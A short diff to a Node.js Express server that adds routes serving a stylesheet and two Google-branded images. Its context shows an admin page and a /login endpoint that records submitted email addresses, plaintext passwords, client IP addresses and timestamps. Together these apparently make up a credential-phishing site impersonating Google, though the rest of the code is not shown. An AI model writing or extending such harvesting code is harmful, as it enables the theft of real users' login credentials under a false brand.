@@ -20,11 +20,24 @@ app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'admin.html'));
 });
 
-const crypto = require('crypto');
+app.get('/style.css', (req, res) => {
+    res.sendFile(path.join(__dirname, 'style.css'));
+});
+
+// Also serve the images explicitly if needed, or rely on static middleware
+app.get('/google.png', (req, res) => {
+    res.sendFile(path.join(__dirname, 'google.png'));
+});
+
+app.get('/google-index.png', (req, res) => {
+    res.sendFile(path.join(__dirname, 'google-index.png'));
+});
+
+// const crypto = require('crypto');
 
 // Endpoint to log login attempts
 app.post('/login', (req, res) => {
-     const { email, password } = req.body;
+    const { email, password } = req.body;
     // Get IP address
     const ip_address = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const timestamp = new Date().toISOString();
